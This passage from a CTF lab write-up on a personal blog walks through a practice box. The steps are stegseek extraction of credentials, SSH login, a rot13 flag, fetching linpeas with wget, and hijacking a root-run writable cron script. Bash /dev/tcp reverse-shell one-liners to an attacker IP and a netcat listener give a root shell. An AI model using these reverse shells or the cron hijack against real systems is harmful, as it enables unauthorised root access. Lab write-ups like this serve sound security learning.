+Time.Started.....: Tue Nov 30 20:48:46 2021 (0 secs)
+Time.Estimated...: Tue Nov 30 20:48:46 2021 (0 secs)
+Guess.Base.......: File (easy.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   147.0 kH/s (6.44ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 4097/5140 (79.71%)
+Rejected.........: 1/4097 (0.02%)
+Restore.Point....: 3072/5140 (59.77%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: vgazoom4x -&gt; flash72
+
+Started: Tue Nov 30 20:45:57 2021
+Stopped: Tue Nov 30 20:48:47 2021
+</code></pre></div></td></tr></table></div>
+<p>Now we have a password, but still no username. We try root as the only know user but no way in. </p>
+<p>Since the room has a tag that says steganography, let's try steghide</p>
+<p>After trying steghide on the picture <code>matrix-3109795_960_720.jpg</code> I've downloaded from the css portion of the page and after I went over the <code>index.html</code> again, I realized there is a picture in the picture and maybe I was trying to crack the wrong picture. After an hour of trying <code>steghide</code> and <code>stegcracker</code> and compiling the new, ultra fast <code>stegseek</code> (recommendation) , everything went smoothly with the right picture <code>binarycodepixabay.jpg</code></p>
+<p>The password is the decoded <code>gost</code> hash <code>mypasswordforthatjob</code>. You can crack the password with the <code>easypeasy.txt</code> and the ultra fast (whole rockyou.txt in 4-5 seconds) <code>stegseek</code> password list as well</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code>└─# stegseek binarycodepixabay.jpg easy.txt                                                                                                                                                                                                               1 ⨯
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: &quot;mypasswordforthatjob&quot;
+[i] Original filename: &quot;secrettext.txt&quot;.
+[i] Extracting to &quot;binarycodepixabay.jpg.out&quot;.
+</code></pre></div></td></tr></table></div>
+<p>The output of <code>binarycodepixabay.jpg.out</code></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code>┌──(root💀kali)-[~/ctf/thm/easypeasy]
+└─# cat binarycodepixabay.jpg.out                                                                                                                                                                                                                       255 ⨯
+username:boring
+password:
+01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+</code></pre></div></td></tr></table></div>
+<p>It's obvious it's binary, with cyberchef it should be easy to get it decoded</p>
+<p><img alt="image-20211130215622596" src="/home/bonzo/Downloads/sdfgfd" /></p>
+<p>With the username <code>boring</code> and the password <code>iconvertedmypasswordtobinary</code> and not forgetting the non-standard port ssh is using, we can log in.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code>└─# ssh boring@10.10.42.67 -p 6498                                                                                                                                                                                                                      255 ⨯
+*************************************************************************
+**        This connection are monitored by government offical          **
+**            Please disconnect if you are not authorized              **
+** A lawsuit will be filed against you if the law is not followed      **
+*************************************************************************
+boring@10.10.42.67&#39;s password: 
+You Have 1 Minute Before AC-130 Starts Firing
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
+You Have 1 Minute Before AC-130 Starts Firing
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
+</code></pre></div></td></tr></table></div>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>boring@kral4-PC:~$ cat user.txt 
+User Flag But It Seems Wrong Like It`s Rotated Or Something
+synt{a0jvgf33zfa0ez4y}
+</code></pre></div></td></tr></table></div>
+<p>Some rotating is mentioned so first think to think about is some kind of <code>caesar cipher</code> or <code>rot13</code></p>
+<p>Using cyberchef again we get the flag</p>
+<p><img alt="image-20211130224956907" src="/home/bonzo/Downloads/image-20211130224956907.png" /></p>
+<p>After we have the user flag we can look at <code>privilege escalation</code>. <code>sudo -l</code> <code>crontab -l</code> give us nothing so let's try with <code>linpeas.sh</code></p>
+<p>On the attacker machine we go to a folder with <code>linpeas.sh</code> in it and in that folder we start a simple http server with<code>python</code> or <code>php</code>.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>bonzo@srv001:/opt/share/scripts/linpeas&gt; python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre></div></td></tr></table></div>
+<p>On the victim machine we go to a folder that's writable (<code>/temp</code>) and get the leanpeas.sh with <code>wget</code> from the attacker machine and make it executable.</p>
+<p>Finally, we start <code>linpeas</code>.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code>boring@kral4-PC:/tmp$ wget 10.14.12.247:8000/linpeas.sh
+--2021-11-30 13:55:44--  http://10.14.12.247:8000/linpeas.sh
+Connecting to 10.14.12.247:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 633658 (619K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                                                      100%[=====================================================================================================================================================&gt;] 618.81K  1.04MB/s    in 0.6s    
+
+2021-11-30 13:55:45 (1.04 MB/s) - ‘linpeas.sh’ saved [633658/633658]
+
+boring@kral4-PC:/tmp$ chmod +x linpeas.sh 
+boring@kral4-PC:/tmp$ ./linpeas.sh
+</code></pre></div></td></tr></table></div>
+<p>Running <code>linpeas</code> we see there is an <code>anacron</code> cronjob running a shell script as root every minute. The shell script is in <code>/var/www/.mysecretcronjob.sh</code></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span></pre></div></td><td class="code"><div><pre><span></span><code>var/spool/anacron:
+total 20
+drwxr-xr-x 2 root root 4096 Jun 13  2020 .
+drwxr-xr-x 6 root root 4096 Apr 26  2018 ..
+-rw------- 1 root root    9 Nov 30 12:24 cron.daily
+-rw------- 1 root root    9 Nov 30 12:34 cron.monthly
+-rw------- 1 root root    9 Nov 30 12:29 cron.weekly
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+* *    * * *   root    cd /var/www/ &amp;&amp; sudo bash .mysecretcronjob.sh
+
+
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+HOME=/root
+LOGNAME=root
+
+1       5       cron.daily      run-parts --report /etc/cron.daily
+7       10      cron.weekly     run-parts --report /etc/cron.weekly
+@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly
+</code></pre></div></td></tr></table></div>
+<p>Changing to that folder and checking the files with <code>ls -al</code> we see that the user <code>boring</code> (we) has full read/write. That means we can change the contents of the file and create a reverse shell. Since the user that runs the shell script through <code>anacron</code> is <code>root</code> we'll get a root shell.</p>
+<p>The initial content of <code>.mysecretcronjob.sh</code></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh 
+#!/bin/bash
+# i will run as root
+boring@kral4-PC:/var/www$ 
+</code></pre></div></td></tr></table></div>
+<p>We can look for reverse shell at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp</p>
+<p>We try a <code>bash</code> reverse shell first because it's  a stable shell and it very often works. If it won't work I usually try a netcat shell. That one always worked for me.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1
+
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+
+/bin/bash -l &gt; /dev/tcp/10.0.0.1/4242 0&lt;&amp;1 2&gt;&amp;1
+</code></pre></div></td></tr></table></div>
+<p>First bash reverse shell was unstable, second was stable but only a simple shell. We can get the root flag anyway. The machine had <code>python3</code> installed so I could span a bash shell so I could see more. Changing the folder to <code>/root/</code> and listing the files, I found the <code>.root.txt</code> (the <code>.</code>means it is hidden so you need the <code>-l</code> option to show all files)</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>/bin/bash -l &gt; /dev/tcp/10.14.12.247/1234 0&lt;&amp;1 2&gt;&amp;1
+</code></pre></div></td></tr></table></div>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code>└─$<span class="w"> </span>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">1234</span><span class="w">                                                                                                                                                                                                                                                                                                        </span><span class="m">1</span><span class="w"> </span>⨯
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">1234</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.14.12.247<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.208.230<span class="o">]</span><span class="w"> </span><span class="m">51916</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+root@kral4-PC:/var/www#<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/root
+<span class="nb">cd</span><span class="w"> </span>/root
+root@kral4-PC:~#<span class="w"> </span>ls<span class="w"> </span>-la
+ls<span class="w"> </span>-la
+total<span class="w"> </span><span class="m">40</span>
+drwx------<span class="w">  </span><span class="m">5</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">15</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">23</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">15</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>..
+-rw-------<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">2</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">14</span>:45<span class="w"> </span>.bash_history
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">3136</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">15</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>.bashrc
+drwx------<span class="w">  </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">13</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>.cache
+drwx------<span class="w">  </span><span class="m">3</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">13</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>.gnupg
+drwxr-xr-x<span class="w">  </span><span class="m">3</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">13</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>.local
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">148</span><span class="w"> </span>Aug<span class="w"> </span><span class="m">17</span><span class="w">  </span><span class="m">2015</span><span class="w"> </span>.profile
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">   </span><span class="m">39</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">15</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>.root.txt
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">   </span><span class="m">66</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>.selected_editor
+root@kral4-PC:~#<span class="w"> </span>cat<span class="w"> </span>.root.txt
+cat<span class="w"> </span>.root.txt
+flag<span class="o">{</span>63a9f0ea7bb98050796b649e85481845<span class="o">}</span>
+root@kral4-PC:~#<span class="w"> </span>id
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+root@kral4-PC:~#<span class="w"> </span>
+</code></pre></div></td></tr></table></div>
+
+
+
+
+
+                 <!-- Giscus -->
+  <h3 id="__comments">Comments</h2>
+  <p>Any feedback and suggestions are welcome. This website was created using mkdocs and the material plugin. If you
+    want, you can make a pull request. The repository is <a
+      href="https://github.com/dabonzo/itsec_hp">https://github.com/dabonzo/itsec_hp</a></p>
+  <script src="https://giscus.app/client.js" data-repo="dabonzo/itsec_hp" data-repo-id="R_kgDOH0fBLg"
+    data-category="General" data-category-id="DIC_kwDOH0fBLs4CQ1Al" data-mapping="pathname" data-strict="0"
+    data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme"
+    data-lang="en" crossorigin="anonymous" async>
+    </script>
+
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    /* Set palette on initial load */
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate" ? "dark" : "light"
+      giscus.setAttribute("data-theme", theme)
+
+
+    }
+
+    /* Register event handlers after documented loaded */
+    document.addEventListener("DOMContentLoaded", function () {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function () {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate" ? "dark" : "light"
+
+          /* Instruct Giscus to change theme */
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+  
+              </article>
+            </div>
+          
+          
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "navigation.sections", "navigation.top", "content.code.annotate"], "search": "../../../../../assets/javascripts/workers/search.dfff1995.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.dff1b7c8.min.js"></script>
+      
+    
+  </body>
+</html>
